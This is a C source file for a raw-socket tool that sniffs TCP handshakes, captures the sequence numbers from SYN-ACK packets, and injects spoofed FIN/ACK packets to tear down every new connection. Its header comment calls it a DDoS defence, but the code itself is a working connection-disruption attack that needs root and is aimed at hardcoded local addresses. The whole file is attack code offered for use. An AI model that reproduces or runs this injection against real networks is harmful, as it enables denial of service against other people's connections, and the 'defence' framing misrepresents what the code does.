/**
 *	Author: Awcator
 *	Tool to guess the TCP sequence number and breaks that particular tcp connnection. There by providing a good defence for DDOS attacks.
 *	
 *	How?:
 *	Captures ack_seq,seq during 2nd stage of 3 way hand shake and performs attack for 4th hand shake
 *	suppose: 2nd Hand Shake: from port 4444 to port 469996 with SQN,ACK seq=781,ack_seq=694
 *	then, craft a packet at 4th transaction as, port from 469996 to 4444 with seq as 694 and ack_seq as 781 with flags, Finish,Ack.
 *	Recomute Checksum and send packet
 *	
 *	Thread Safety: Nope, just a single threaded one
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <string.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>

#define stream stdout
#define buffersize 1024
#define DATA "awcator"

unsigned int showPackets=0;
unsigned short hasEathernetHeader=0;
unsigned int sq=0,asq=0;
int sockfd,temp_port=0,temp_port2=0;

struct pseudoTCPPacket {
	uint32_t srcAddr;
	uint32_t dstAddr;
	uint8_t zero;
	uint8_t protocol;
	uint16_t TCP_len;
};

unsigned short csum(unsigned short *ptr,int nbytes);
void fakeit();
void ethernet_header(unsigned char* Buffer, int Size);
void ip_header(unsigned char* Buffer, int Size);
void tcp_packet(unsigned char* Buffer, int Size);

unsigned short csum(unsigned short *ptr,int nbytes) {
	long sum;
	unsigned short oddbyte;
	short answer;
	//Debug info
	//hexdump((unsigned char *) ptr, nbytes);
	//printf("csum nbytes: %d\n", nbytes);
	//printf("csum ptr address: %p\n", ptr);
	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}
	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	return(answer);
}

void fakeit(){
	int sock, bytes, one = 1;
	struct iphdr *ipHdr;
	struct tcphdr *tcpHdr;

	//Setup

	char *srcIP = "192.168.42.11";
	char *dstIP = "192.168.42.11";
	/*
	   char *srcIP = "192.168.1.100";
	   char *dstIP = "192.168.1.100";
	   */
	int dstPort = temp_port2;
	int srcPort = temp_port;

	//Initial guess
	//uint32_t initSeqGuess = 1138083240;
	//uint32_t initSeqGuess = asq;
	char *data;
	char packet[512];
	struct sockaddr_in addr_in;
	struct pseudoTCPPacket pTCPPacket;
	char *pseudo_packet;
	if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		perror("Error while creating socket");
		exit(-1);
	}
	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) < 0) {
		perror("Error while setting socket options");
		exit(-1);
	}

	//Populate address struct
	addr_in.sin_family = AF_INET;
	addr_in.sin_port = htons(dstPort);
	addr_in.sin_addr.s_addr = inet_addr(dstIP);

	//Allocate mem for ip and tcp headers and zero the allocation
	memset(packet, 0, sizeof(packet));
	ipHdr = (struct iphdr *) packet;
	tcpHdr = (struct tcphdr *) (packet + sizeof(struct iphdr));
	data = (char *) (packet + sizeof(struct iphdr) + sizeof(struct tcphdr));
	strcpy(data, DATA);

	//Populate ipHdr
	ipHdr->ihl = 5; 
	ipHdr->version = 4; 
	ipHdr->tos = 0;
	ipHdr->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
	ipHdr->id = htons(54321); 
	ipHdr->frag_off = 0x00;
	ipHdr->ttl = 0xFF;
	ipHdr->protocol = IPPROTO_TCP; 
	ipHdr->check = 0; 
	ipHdr->saddr = inet_addr(srcIP);
	ipHdr->daddr = inet_addr(dstIP);
	ipHdr->check = csum((unsigned short *) packet, ipHdr->tot_len); 
	//printf("IP header checksum: %d\n\n\n", ipHdr->check);
	//Populate tcpHdr
	tcpHdr->source = htons(srcPort);
	tcpHdr->dest = htons(dstPort);
	tcpHdr->seq = 0x0;
	tcpHdr->ack_seq = 0x0;
	tcpHdr->doff = 5;
	tcpHdr->res1 = 0;
	//tcpHdr->cwr = 0; //Congestion control mechanism
	//tcpHdr->ece = 0; //Congestion control mechanism
	tcpHdr->urg = 0; 
	tcpHdr->ack = 1; 
	tcpHdr->psh = 0; 
	tcpHdr->rst = 0; 
	tcpHdr->syn = 0; 
	tcpHdr->fin = 1; 
	tcpHdr->window = htons(155);
	tcpHdr->check = 0; 
	tcpHdr->urg_ptr = 0; 

	//For checksum
	pTCPPacket.srcAddr = inet_addr(srcIP);
	pTCPPacket.dstAddr = inet_addr(dstIP);
	pTCPPacket.zero = 0;
	pTCPPacket.protocol = IPPROTO_TCP;
	pTCPPacket.TCP_len = htons(sizeof(struct tcphdr) + strlen(data));
	pseudo_packet = (char *) malloc((int) (sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) + strlen(data)));
	memset(pseudo_packet, 0, sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) + strlen(data));
	memcpy(pseudo_packet, (char *) &pTCPPacket, sizeof(struct pseudoTCPPacket));
	int i=0;
	while(i<5) { 
		tcpHdr->seq = htonl(asq);
		tcpHdr->ack_seq = htonl(sq+1);
		tcpHdr->check = 0;
		memcpy(pseudo_packet + sizeof(struct pseudoTCPPacket), tcpHdr, sizeof(struct tcphdr) + strlen(data));
		tcpHdr->check = (csum((unsigned short *) pseudo_packet, (int) (sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) +  strlen(data))));
		//printf("TCP Checksum: %d\n", (int) tcpHdr->check);
		if((bytes = sendto(sock, packet, ipHdr->tot_len, 0, (struct sockaddr *) &addr_in, sizeof(addr_in))) < 0) {
			perror("Error on sendto()");
		}
		else {
			//printf("Success! Sent %d bytes.\n", bytes);
		}
		//printf("SEQ guess: %u\n\n", initSeqGuess);
		//sleep(sensitivity);
		i++;//break;
	}
}
void ethernet_header(unsigned char* Buffer, int Size){
	if(showPackets==1){
		struct ethhdr *eth = (struct ethhdr *)Buffer;
		fprintf(stream , "\n");
		fprintf(stream , "Ethernet Header\n");
		fprintf(stream , "   |-Destination Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", eth->h_dest[0] , eth->h_dest[1] , eth->h_dest[2] , eth->h_dest[3] , eth->h_dest[4] , eth->h_dest[5] );
		fprintf(stream , "   |-Source Address      : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", eth->h_source[0] , eth->h_source[1] , eth->h_source[2] , eth->h_source[3] , eth->h_source[4] , eth->h_source[5] );
		fprintf(stream , "   |-Protocol            : %u \n",(unsigned short)eth->h_proto);
	}
}

void ip_header(unsigned char* Buffer, int Size){
	struct sockaddr_in source,dest;
	//unsigned short iphdrlen;
	struct iphdr *iph;
	if(hasEathernetHeader==0){
		iph = (struct iphdr *)(Buffer);
		//iphdrlen =iph->ihl*4;
	}
	else{
		ethernet_header(Buffer , Size);
		iph = (struct iphdr *)(Buffer  + sizeof(struct ethhdr) );
		//iphdrlen =iph->ihl*4;
	}
	memset(&source, 0, sizeof(source));
	source.sin_addr.s_addr = iph->saddr;
	memset(&dest, 0, sizeof(dest));
	dest.sin_addr.s_addr = iph->daddr;
	if(showPackets==1){
		fprintf(stream , "\n");
		fprintf(stream , "IP Header\n");
		fprintf(stream , "   |-IP Version        : %d\n",(unsigned int)iph->version);
		fprintf(stream , "   |-IP Header Length  : %d DWORDS or %d Bytes\n",(unsigned int)iph->ihl,((unsigned int)(iph->ihl))*4);
		fprintf(stream , "   |-Type Of Service   : %d\n",(unsigned int)iph->tos);
		fprintf(stream , "   |-IP Total Length   : %d  Bytes(Size of Packet)\n",ntohs(iph->tot_len));
		fprintf(stream , "   |-Identification    : %d\n",ntohs(iph->id));
		fprintf(stream , "   |-TTL      : %d\n",(unsigned int)iph->ttl);
		fprintf(stream , "   |-Protocol : %d\n",(unsigned int)iph->protocol);
		fprintf(stream , "   |-Checksum : %d\n",ntohs(iph->check));
		fprintf(stream , "   |-Source IP        : %s\n",inet_ntoa(source.sin_addr));
		fprintf(stream , "   |-Destination IP   : %s\n",inet_ntoa(dest.sin_addr));
	}
}

void tcp_packet(unsigned char* Buffer, int Size){
	unsigned short iphdrlen;
	struct iphdr *iph;
	struct tcphdr *tcph;
	//int header_size;

	if(hasEathernetHeader==0){
		//Without Ethernet Header
		iph = (struct iphdr *)( Buffer);
		iphdrlen = iph->ihl*4;
		tcph=(struct tcphdr*)(Buffer + iphdrlen);
		//header_size = iphdrlen + tcph->doff*4;
	}
	else{
		//Including Ethernet Headers:
		iph = (struct iphdr *)( Buffer  + sizeof(struct ethhdr) );
		iphdrlen = iph->ihl*4;
		tcph=(struct tcphdr*)(Buffer + iphdrlen + sizeof(struct ethhdr));
		//int header_size =  sizeof(struct ethhdr) + iphdrlen + tcph->doff*4;
	}
	if(showPackets==1){
		fprintf(stream , "\n\n***********************TCP Packet*************************\n");  
		ip_header(Buffer,Size);
		fprintf(stream , "\n");
		fprintf(stream , "TCP Header\n");
		fprintf(stream , "   |-Source Port      : %u\n",ntohs(tcph->source));
		fprintf(stream , "   |-Destination Port : %u\n",ntohs(tcph->dest));
		fprintf(stream , "   |-Sequence Number    : %u\n",ntohl(tcph->seq));
		fprintf(stream , "   |-Acknowledge Number : %u\n",ntohl(tcph->ack_seq));
		fprintf(stream , "   |-Header Length      : %d DWORDS or %d BYTES\n" ,(unsigned int)tcph->doff,(unsigned int)tcph->doff*4);
		//fprintf(stream , "   |-CWR Flag : %d\n",(unsigned int)tcph->cwr);
		//fprintf(stream , "   |-ECN Flag : %d\n",(unsigned int)tcph->ece);
		fprintf(stream , "   |-Urgent Flag          : %d\n",(unsigned int)tcph->urg);
		fprintf(stream , "   |-Acknowledgement Flag : %d\n",(unsigned int)tcph->ack);
		fprintf(stream , "   |-Push Flag            : %d\n",(unsigned int)tcph->psh);
		fprintf(stream , "   |-Reset Flag           : %d\n",(unsigned int)tcph->rst);
		fprintf(stream , "   |-Synchronise Flag     : %d\n",(unsigned int)tcph->syn);
		fprintf(stream , "   |-Finish Flag          : %d\n",(unsigned int)tcph->fin);
		fprintf(stream , "   |-Window         : %d\n",ntohs(tcph->window));
		fprintf(stream , "   |-Checksum       : %d\n",ntohs(tcph->check));
		fprintf(stream , "   |-Urgent Pointer : %d\n",tcph->urg_ptr);
		fprintf(stream , "*********************************************************************\n");
	}
	//Notedown sequnce numbers, Capture 3 way hand shake
	if(tcph->syn==1 && tcph->ack==1){
		sq=ntohl(tcph->seq);
		asq=ntohl(tcph->ack_seq);
		temp_port=ntohs(tcph->dest);
		temp_port2=ntohs(tcph->source);
		//printf("New Connection created %u %u\n",sq,asq);
		fakeit();
	}
}

int main(int argc,char **argv){
	if(argc>=2){
		int i=0;
		for(i=1;i<argc;i=i+2){
			if(argv[i][0]=='-' && argv[i][1]=='-') {
				if(strcmp(argv[i],"--verbrose_level")==0) {
					int VERBROSE_LEVEL=atoi(argv[i+1]);
					if(VERBROSE_LEVEL==2){
						showPackets=1;
					}
				}
			}
		}
	}
	int nbytes;
	unsigned char buffer[buffersize];
	printf("\n****************************Low level TCP Syn packet Dropper*****************\n");
	sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if (sockfd == -1) {
		perror("socket");
		printf("Run as root\n" );
		return -1;
	}
	printf("Ready to intercept & fire Fin Packets for upcoming  3way handshakes!\nrunning...\n");
	while(1){
		nbytes=0;
		memset(buffer, 0x00, buffersize);
		nbytes = read(sockfd, buffer, buffersize - 1);
		if (nbytes > 0) {
			//ethernet_header(buffer,buffersize);
			//ip_header(buffer,buffersize);
			tcp_packet(buffer,buffersize);
		}
	}
	return 0;
}
